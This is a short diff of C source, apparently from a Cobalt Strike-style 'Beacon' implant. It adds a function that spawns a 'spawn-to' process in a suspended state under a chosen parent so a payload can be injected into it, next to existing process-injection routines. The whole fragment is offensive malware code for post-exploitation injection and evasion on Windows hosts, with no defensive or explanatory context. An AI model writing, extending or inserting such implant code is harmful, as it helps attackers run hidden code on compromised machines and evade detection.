@@ -1232,6 +1232,13 @@ void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, i
 	BeaconInjectProcessInternal(pInfo, pInfo->hProcess, pInfo->dwProcessId, payload, p_len, p_offset, arg, a_len);
 }
 
+BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo)
+{
+	char cmd[MAX_PATH];
+	SpawnToFix(x86, cmd);
+	return RunUnderParent(cmd, strlen(cmd), si, pInfo, CREATE_SUSPENDED, ignoreToken);
+}
+
 void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
 {
 	if (pInfo->hProcess)
